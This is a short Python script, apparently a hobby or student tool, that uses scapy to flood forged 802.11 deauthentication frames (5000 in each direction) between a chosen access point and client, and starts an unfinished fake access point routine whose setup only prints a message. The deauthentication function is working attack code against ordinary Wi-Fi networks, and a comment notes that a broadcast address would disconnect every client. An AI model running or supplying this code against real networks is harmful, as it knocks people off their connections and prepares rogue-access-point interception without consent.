from  scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, RadioTap, Dot11Deauth, Dot11Elt

class Fake:
    def __init__(self, interface, net_mac, cli_mac):
        self.interface = interface
        self.net_mac = net_mac
        self.cli_mac = cli_mac
        print('\ncreating fake ap')
    
    def deauthentication_packet(self):
        # deauthentication packets
        # if addr = 'ff:ff:ff:ff:ff:ff' than will disconnect all the cliens. harmful!
        # reason 3 - because sending station is leaving 
        # or has left independent Basic Service Service Set (IBSS) or ESS
        ap_deauth = RadioTap()/Dot11(addr1=self.cli_mac, addr2=self.net_mac, addr3=self.net_mac)/Dot11Deauth()
        cli_deauth = RadioTap()/Dot11(addr1=self.net_mac, addr2=self.cli_mac, addr3=self.cli_mac)/Dot11Deauth()

        print('\nsend deauthentication packet...')

        sendp(ap_deauth, count=5000, iface=self.interface)
        sendp(cli_deauth, count=5000, iface=self.interface)

    def fake_ap(self):
        print('\ncreate fake access point')
        self.create_enviroment()
    
    def create_enviroment(self):
        print('\ncreating necessary files...')